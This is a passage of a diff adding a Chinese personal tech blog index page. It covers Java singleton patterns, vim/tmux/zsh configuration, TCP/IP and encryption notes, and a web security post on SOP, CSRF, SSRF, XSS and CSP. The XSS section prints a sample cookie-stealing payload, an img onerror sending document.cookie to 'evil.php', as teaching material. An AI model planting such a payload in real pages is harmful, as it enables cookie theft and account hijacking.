class="line"></span><br><span class="line">    private static class SingletonClassInstance &#123;</span><br><span class="line">        private static final Singleton3 instance = new Singleton3();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private Singleton3() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    public static Singleton3 getInstance() &#123;</span><br><span class="line">        return SingletonClassInstance.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 枚举本身就是单例模式, JVM保证(没有延时加载)</span><br><span class="line"> */</span><br><span class="line">enum Singleton4 &#123;</span><br><span class="line"></span><br><span class="line">    // 这个枚举元素本身就是单例对象</span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    public void singletonOperation() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * new一个对象半初始化,加volatile防止指令重排序</span><br><span class="line"> * 如果不加volatile, thread 2 判断 if (instance != null) 后, 会使用了半初始化的对象</span><br><span class="line"> */</span><br><span class="line">class DclSingleton &#123;</span><br><span class="line">    private static volatile DclSingleton instance;</span><br><span class="line">    public static DclSingleton getInstance() &#123;</span><br><span class="line">        if (instance == null) &#123;</span><br><span class="line">            synchronized (DclSingleton .class) &#123;</span><br><span class="line">                if (instance == null) &#123;</span><br><span class="line">                    instance = new DclSingleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // private constructor and other methods...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="通过反射方式直接调用私有构造器"><a href="#通过反射方式直接调用私有构造器" class="headerlink" title="通过反射方式直接调用私有构造器"></a>通过反射方式直接调用私有构造器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;Singleton&gt; clazz = (Class&lt;Singleton&gt;) Class.forName(&quot;Singleton&quot;);</span><br><span class="line">Constructor&lt;Singleton&gt; cons = clazz.getDeclaredConstructor(null);</span><br><span class="line">cons.setAccessible(true);</span><br><span class="line">Singleton s3 = cons.newInstance();</span><br><span class="line">Singleton s4 = cons.newInstance();</span><br><span class="line">System.out.println(s3);</span><br><span class="line">System.out.println(s4);</span><br><span class="line">// Singleton@610455d6</span><br><span class="line">// Singleton@511d50c0</span><br></pre></td></tr></table></figure>
+
+<h2 id="防止利用反射"><a href="#防止利用反射" class="headerlink" title="防止利用反射"></a>防止利用反射</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private Singleton() &#123; // 第二次调用就抛出异常</span><br><span class="line">       if (instance != null) throw new RuntimeException();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/10/10/design-pattern/" data-id="ckqhp9u6w000z3ot00ea6h1wx" data-title="设计模式" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JVM/" rel="tag">JVM</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-zsh-vim-tmux-config" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/08/30/zsh-vim-tmux-config/" class="article-date">
+  <time class="dt-published" datetime="2020-08-30T16:20:30.000Z" itemprop="datePublished">2020-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/08/30/zsh-vim-tmux-config/">zsh/vim/tmux 配置</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">set nocompatible              &quot; be iMproved, required</span><br><span class="line">set nu</span><br><span class="line">set backspace=2</span><br><span class="line">set foldmethod=syntax</span><br><span class="line">set foldclose=all</span><br><span class="line">set ignorecase</span><br><span class="line">set smartcase</span><br><span class="line"></span><br><span class="line">syntax on</span><br><span class="line"></span><br><span class="line">imap &lt;C-n&gt; &lt;Down&gt;</span><br><span class="line">imap &lt;C-p&gt; &lt;Up&gt;</span><br><span class="line">imap &lt;C-@&gt; &lt;C-Space&gt;</span><br><span class="line"></span><br><span class="line">filetype off                  &quot; required</span><br><span class="line">&quot; set the runtime path to include Vundle and initialize</span><br><span class="line">set rtp+=~/.vim/bundle/Vundle.vim</span><br><span class="line">call vundle#begin()</span><br><span class="line">&quot; alternatively, pass a path where Vundle should install plugins</span><br><span class="line">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span><br><span class="line"></span><br><span class="line">&quot; let Vundle manage Vundle, required</span><br><span class="line">Plugin &#x27;VundleVim/Vundle.vim&#x27;</span><br><span class="line">Plugin &#x27;tomtom/tcomment_vim&#x27;</span><br><span class="line">Plugin &#x27;itchyny/lightline.vim&#x27;</span><br><span class="line">Plugin &#x27;octol/vim-cpp-enhanced-highlight&#x27;</span><br><span class="line">Plugin &#x27;907th/vim-auto-save&#x27;</span><br><span class="line"></span><br><span class="line">&quot; All of your Plugins must be added before the following line</span><br><span class="line">call vundle#end()            &quot; required</span><br><span class="line">filetype plugin indent on    &quot; required</span><br><span class="line">&quot; To ignore plugin indent changes, instead use:</span><br><span class="line">&quot;filetype plugin on</span><br><span class="line">&quot;</span><br><span class="line">&quot; Brief help</span><br><span class="line">&quot; :PluginList       - lists configured plugins</span><br><span class="line">&quot; :PluginInstall    - installs plugins; append `!` to update or just :PluginUpdate</span><br><span class="line">&quot; :PluginSearch foo - searches for foo; append `!` to refresh local cache</span><br><span class="line">&quot; :PluginClean      - confirms removal of unused plugins; append `!` to auto-approve removal</span><br><span class="line">&quot;</span><br><span class="line">&quot; see :h vundle for more details or wiki for FAQ</span><br><span class="line">&quot; Put your non-Plugin stuff after this line</span><br><span class="line"></span><br><span class="line">autocmd FileType cpp nmap &lt;buffer&gt; &lt;F9&gt; :w&lt;bar&gt;! g++ -W -std=c++0x -o %:t:r %:t &amp;&amp; ./%:t:r &lt;Cr&gt;</span><br><span class="line">autocmd FileType python nmap &lt;buffer&gt; &lt;F9&gt; :w&lt;bar&gt;! python %:t &lt;Cr&gt;</span><br><span class="line">autocmd FileType cpp nmap &lt;buffer&gt; &lt;F10&gt; :w&lt;bar&gt;! g++ -W -std=c++0x -o %:t:r %:t &amp;&amp; ./%:t:r &lt; in&lt;Cr&gt;</span><br><span class="line">let g:auto_save = 1  &quot; enable AutoSave on Vim startup</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h2><p>from <a target="_blank" rel="noopener" href="https://github.com/gpakosz/.tmux">https://github.com/gpakosz/.tmux</a><br>在.tmux.conf.local末尾添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># move status line to top</span><br><span class="line">#set -g status-position top</span><br><span class="line">tmux_conf_theme_status_left=&#x27;  #S | &#x27;</span><br><span class="line">tmux_conf_theme_status_right=&#x27;#&#123;prefix&#125;#&#123;pairing&#125;#&#123;synchronized&#125;, %R , %d %b |&#x27;</span><br><span class="line">tmux_conf_theme_status_left_bg=&#x27;#00afff,#00afff,#00afff&#x27;</span><br><span class="line">set-option -g repeat-time 1</span><br><span class="line">set-option -g status-position top</span><br><span class="line">set-window-option -g mode-keys vi</span><br></pre></td></tr></table></figure>
+
+<h2 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h2><p>install zsh, oh-my-zsh</p>
+<p>use custom theme <code>powerlevel9k/powerlevel9k</code><br><a target="_blank" rel="noopener" href="https://github.com/Powerlevel9k/powerlevel9k/wiki/Install-Instructions#arch-linux">https://github.com/Powerlevel9k/powerlevel9k/wiki/Install-Instructions#arch-linux</a></p>
+<p>加入插件 ~/.zshrc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># plugins=(git)</span><br><span class="line">plugins=(</span><br><span class="line">	zsh-syntax-highlighting</span><br><span class="line">	zsh-autosuggestions</span><br><span class="line">	autojump</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/08/30/zsh-vim-tmux-config/" data-id="ckqhp9u71001m3ot0ahqb2b9f" data-title="zsh/vim/tmux 配置" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-network" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/08/06/network/" class="article-date">
+  <time class="dt-published" datetime="2020-08-07T06:50:02.000Z" itemprop="datePublished">2020-08-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/08/06/network/">TCP/IP</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dGhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11</span><br></pre></td></tr></table></figure>
+
+<p>b37a4f2cc0624f1690f64606cf385945b2bec4ea</p>
+<h2 id="Hardware-and-Software-Orgnization-of-an-Internet-Application"><a href="#Hardware-and-Software-Orgnization-of-an-Internet-Application" class="headerlink" title="Hardware and Software Orgnization of an Internet Application"></a>Hardware and Software Orgnization of an Internet Application</h2><p><img src="/images/network/org.png"></p>
+<p>socket addresss: <strong>IPaddresss:port pair</strong></p>
+<p>A <strong>port</strong> is a 16-bit integer that identifies a process</p>
+<ul>
+<li>Ephemeral port: Assigned automatically by client kernel when client makes a connection request</li>
+<li>Well-known port: Associated with some service provided by a server</li>
+</ul>
+<p><img src="/images/network/overview.png" alt="stack"><br><img src="/images/network/https.png" alt="stack"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/08/06/network/" data-id="ckqhp9u6x00123ot0czev334t" data-title="TCP/IP" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-crypto" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/08/06/crypto/" class="article-date">
+  <time class="dt-published" datetime="2020-08-07T04:51:31.000Z" itemprop="datePublished">2020-08-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/08/06/crypto/">对称加密/非对称加密</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>公钥加密，私钥解密：传输只给私钥持有者看到的信息</strong><br><strong>私钥加密，公钥解密：信息公开，但是无法被中间人篡改</strong></p>
+<blockquote>
+<p>对称加密，用同一个密码加密和解密。<br>缺点：密码被中间人截取</p>
+</blockquote>
+<blockquote>
+<p>非对称加密，客户端公钥加密{对称加密用到的密码}，服务器端私钥解密。<br>缺点：获取服务器公钥的时候，被中间人替换替换<br>可以暴力破解吗？无意义，密码一段时间过期会替换，即便爆破成功密码也会变化。</p>
+</blockquote>
+<blockquote>
+<p>CA: 客户端从CA获取认证的服务器公钥。域名认证相应的公钥，需要提供法人信息，并在服务器上放一个随机字符串证明服务器是自己的。<br>CA私钥加密{非对称加密用到的公钥}，客户端用CA公钥解密（已经存储在浏览器中）。<br>好处：无法被中间人篡改，CA公钥解密后中间人没有CA私钥无法再次加密</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/08/06/crypto/" data-id="ckqhp9u6v000x3ot0aa1k8uns" data-title="对称加密/非对称加密" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-web-security" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/06/15/web-security/" class="article-date">
+  <time class="dt-published" datetime="2020-06-16T00:05:45.000Z" itemprop="datePublished">2020-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/06/15/web-security/">web security</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="同源协议（SOP"><a href="#同源协议（SOP" class="headerlink" title="同源协议（SOP)"></a>同源协议（SOP)</h1><p>所谓的同源协议，就是阻止程序员访问第三方数据的一种手段，对浏览器本身是没有任何的影响。换句话说，图片该显示显示，但你无法获取到它的二进制，iframe该展示展示，但你获取不到它的节点，ajax该读取读取，但你获取不到它的响应文。</p>
+<p>同源协议可以</p>
+<ul>
+<li>跨域写操作</li>
+<li>跨域嵌入操作<br>不可以</li>
+<li>跨域读操作</li>
+</ul>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>（Cross-site request forgery）跨站请求伪造，是一种常见的攻击方式。是指 A 网站正常登陆后，cookie 正常保存，其他网站 B 通过某种方式调用 A 网站接口进行操作，A 的接口在请求时会自动带上 cookie。<br>上面说了，SOP 可以通过 html tag 加载资源，而且 SOP 不阻止接口请求而是拦截请求结果，CSRF 恰恰占了这两个便宜。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 使用xhr请求会受到sop限制，不会带上cookie</span><br><span class="line"> &lt;script&gt;</span><br><span class="line">        var xhr = new XMLHttpRequest();</span><br><span class="line">        xhr.onreadystatechange = function() &#123;//服务器返回值的处理函数，此处使用匿名函数进行实现</span><br><span class="line">            if (xhr.readyState == 4 &amp;&amp; xhr.status == 200) &#123;//</span><br><span class="line">                var responseText = xhr.responseText;</span><br><span class="line">                document.getElementById(&#x27;result&#x27;).innerHTML = responseText;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xhr.open(&quot;GET&quot;, &quot;http://dummy.restapiexample.com/api/v1/employees&quot;, true);//提交get请求到服务器</span><br><span class="line">        xhr.send(null);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  // 使用img的tag请求会带上cookie</span><br><span class="line">    &lt;img src=&quot;http://dummy.restapiexample.com/api/v1/employees&quot;/&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>CSRF自动防御策略：同源检测（Origin 和 Referer 验证）。</li>
+<li>CSRF主动防御措施：Token验证 或者 双重Cookie验证 以及配合Samesite Cookie。</li>
+<li>保证页面的幂等性，后端接口不要在GET页面中做用户操作。</li>
+</ul>
+<p>samesite cookie</p>
+<p>第三方网站引导发出的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。<br>Cookie 的SameSite属性用来限制第三方 Cookie，从而减少安全风险。但可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。</p>
+<!-- ![](/images/web_security/same_site.png) -->
+
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF，服务器端请求伪造，服务器请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS 跨站脚本攻击，用户注入恶意的代码，浏览器和服务器没有对用户的输入进行过滤，导致用户注入的脚本嵌入到了页面中。由于浏览器无法识别这些恶意代码正常解析执行，攻击者的恶意操作被成功执行，比如可以获取用户的cookie数据然后发送给自己或者冒充正常用户向被攻击的服务器发送请求。</p>
+<p>xss攻击分类</p>
+<ul>
+<li>反射型：攻击者构造一个带有恶意代码的url链接诱导正常用户点击，服务器接收到这个url对应的请求读取出其中的参数然后没有做过滤就拼接到Html页面发送给浏览器，浏览器解析执行</li>
+<li>存储型： 攻击者将带有恶意代码的内容发送给服务器（比如在论坛上发帖），服务器没有做过滤就将内容存储到数据库中，下次再请求这个页面的时候服务器从数据库中读取出相关的内容拼接到html上，浏览器收到之后解析执行</li>
+<li>dom型：dom型xss主要和前端js有关，是前端js获取到用户的输入没有进行过滤然后拼接到html中</li>
+</ul>
+<p>xss危害</p>
+<ol>
+<li>cookie劫持（窃取cookie）</li>
+<li>钓鱼，利用xss构造出一个登录框，骗取用户账户密码。</li>
+</ol>
+<p>利用错误信息和搜索结果的反射进行的 XSS，称为反射型 XSS<br>盗取用户 cookie，例如插入这样一段代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img</span><br><span class="line">  src=&quot;xx&quot;</span><br><span class="line">  onerror=&quot;post(&#x27;../evil.php?cakemonster=&#x27; + escape(document.cookie))&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还有另一种 XSS 是储存型 XSS。储存型也比较容易理解，攻击者把恶意脚本提交到被害服务器，并成功储存，所有人访问特定页面都会遭到攻击。</p>
+<p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p>
+<p>XSS防御：</p>
+<p>对于XSS攻击来说，通常有两种方式来进行防御。</p>
+<p>1、转义字符；<br>2、CSP安全内容策略：CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。</p>
+<h1 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content Security Policy"></a>Content Security Policy</h1><p>CSP 诞生的主要目的就是防御 XSS 攻击. 严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p>
+<ul>
+<li>禁止加载外域代码，防止复杂的攻击逻辑。</li>
+<li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li>
+<li>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</li>
+<li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</li>
+<li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li>
+</ul>
+<p>CSP 的作用</p>
+<ol>
+<li>不允许内联script执行</li>
+<li>不允许加载非信任的脚本资源</li>
+<li>不允许向非信任的url发送信息</li>
+</ol>
+<p>通常可以通过两种方式来开启 CSP：</p>
+<ul>
+<li>设置 HTTP Header 中的 Content-Security-Policy</li>
+<li>设置 meta 标签的方式</li>
+</ul>
+<p>CSP doesn’t (and can’t) prevent CSRF. Even if you forbid all scripts from executing, CSRF attacks are still possible if no per-request tokens are used</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/06/15/web-security/" data-id="ckqhp9u6z001b3ot06u8vfa5p" data-title="web security" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ACM/" rel="tag">ACM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JVM/" rel="tag">JVM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Spring/" rel="tag">Spring</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ACM/" style="font-size: 15px;">ACM</a> <a href="/tags/CTF/" style="font-size: 12.5px;">CTF</a> <a href="/tags/JVM/" style="font-size: 17.5px;">JVM</a> <a href="/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/tags/Spring/" style="font-size: 10px;">Spring</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/06/13/python/">Python</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/09/virtualbox-ubuntu/">virtualbox ubuntu安装配置</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/08/v2ray/">搭梯子</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/08/SuffixArray/">SuffixArray</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/29/IO-Multiplexing/">I/O 多路复用</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
